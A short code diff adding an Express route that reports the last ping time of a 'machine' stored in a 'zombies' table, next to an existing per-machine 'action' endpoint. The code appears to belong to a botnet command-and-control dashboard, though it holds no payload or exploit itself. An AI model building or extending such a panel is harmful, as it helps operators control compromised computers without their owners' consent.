@@ -82,6 +82,28 @@ app.get('/dashboard/machines/:id', (req, res) => {
     }
 });
 
+app.get('/dashboard/machines/:id/ping', (req, res) => {
+    if(req.session.loggedin !== true)
+    {
+        res.redirect('/auth/login');
+    }
+    else
+    {
+        database.query("SELECT * FROM zombies WHERE owner = ? AND id = ? LIMIT 1", [req.session.user.id, req.params.id], function(error, machines, fields) {
+            if(machines.length >= 1)
+            {
+                const machine = machines[0];
+                res.status(200).json({status: "success", last_ping: machine.last_ping});
+            }
+            else
+            {
+                res.status(404).render('404');
+            }
+        });
+    }
+});
+
+
 app.post('/dashboard/machines/:id/action', (req, res) => {
     if(req.session.loggedin !== true)
     {
